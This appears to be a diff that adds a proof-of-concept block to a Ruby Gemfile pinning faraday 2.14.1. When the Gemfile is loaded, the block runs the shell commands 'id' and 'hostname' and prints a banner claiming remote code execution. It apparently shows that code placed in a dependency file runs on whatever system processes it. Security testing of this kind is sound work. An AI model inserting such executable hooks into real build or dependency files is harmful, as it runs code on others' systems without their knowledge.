@@ -1,3 +1,11 @@
+# --- POC START ---
+res = `id && hostname`
+puts "========================================"
+puts "🚀 POC SUCCESS: RCE EXECUTED!"
+puts res
+puts "========================================"
+# --- POC END ---
+
 source "https://rubygems.org"
 
 gem "faraday", "2.14.1"
